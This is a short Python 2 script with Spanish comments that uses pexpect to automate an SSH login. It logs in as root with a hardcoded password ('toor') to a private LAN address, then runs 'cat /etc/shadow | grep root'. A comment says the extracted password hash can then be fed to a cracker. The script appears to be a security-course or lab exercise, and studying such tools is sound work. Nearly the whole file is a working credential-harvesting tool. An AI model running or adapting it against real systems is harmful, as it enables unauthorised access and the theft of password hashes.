import pexpect

# Posibles PROMPTs que nos podemos encontrar.
PROMPT = ['# ', '>>> ', '> ', '\$ ']

# Funcion a traves de la cual podemos enviar un comando
def sendCommand(child, cmd):
	child.sendline(cmd)
	child.expect(PROMPT)
	print child.before

# Funcion que se encarga de la conexion. Le pasamos como parametro los datos
# de acceso, usuario, host y password.
def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	# Cadena de conexion.
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	# Definimos posibles respuestas que el servidor de ssh no puede retornar.
	# Un timeout, solicitar que confirmemos la conexion, o que introduzcamos
	# el password.
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
	# Caso de timeout
	if ret == 0:
		print '[-] Error Connecting'
		return
	# Caso de que se nos pida la confirmacion para continuar.
	if ret == 1:
		# Confirmamos la conexion.
		child.sendline('yes')
		# Reintentamos la conexion. Solamente dos opciones deberian de ser
		# viables.
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
		# En caso de un posible fallo despues de confirmar la conexion.
		if ret == 0:
			print '[-] Error Connecting'
			return
	# Si todo ha ido bien, le pasamos el password a la conexion.
	child.sendline(password)
	# Esperamos el PROMPT
	child.expect(PROMPT)
	# Retornamos el proceso que ha gestionado la conexion por ssh.
	return child

# Funcion principal.
def main():
	host = '192.168.0.211'
	user  = 'root'
	password = 'toor'
	# Nos conectamos por ssh y recuperamos el proceso que ha realizado dicha 
	# conexion.
	child = connect(user, host, password)	
	# Hacemos un cat sobre el fichero /etc/shadow del host remoto y extraemos
	# la linea del password. Esta informacion, posteriormente se la podemos
	# pasar al crackeador :-p
	sendCommand(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
	main()